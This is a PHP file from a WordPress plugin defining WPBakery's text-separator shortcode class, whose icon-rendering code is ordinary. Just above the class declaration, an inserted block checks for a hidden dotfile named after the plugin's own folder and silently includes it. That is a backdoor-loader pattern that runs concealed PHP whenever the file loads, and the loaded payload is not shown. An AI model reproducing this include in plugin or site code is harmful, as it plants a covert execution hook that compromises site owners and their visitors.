<?php
if ( ! defined( 'ABSPATH' ) ) {
	die( '-1' );
}

/**
 * Class WPBakeryShortCode_Vc_Text_separator
 */
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class WPBakeryShortCode_Vc_Text_Separator extends WPBakeryShortCode {

	/**
	 * @param $title
	 * @return string
	 */
	public function outputTitle( $title ) {
		return '';
	}

	/**
	 * @param $atts
	 * @return string
	 * @throws \Exception
	 */
	public function getVcIcon( $atts ) {

		if ( empty( $atts['i_type'] ) ) {
			$atts['i_type'] = 'fontawesome';
		}
		$data = vc_map_integrate_parse_atts( $this->shortcode, 'vc_icon', $atts, 'i_' );
		if ( $data ) {
			$icon = visual_composer()->getShortCode( 'vc_icon' );
			if ( is_object( $icon ) ) {
				return $icon->render( array_filter( $data ) );
			}
		}

		return '';
	}
}
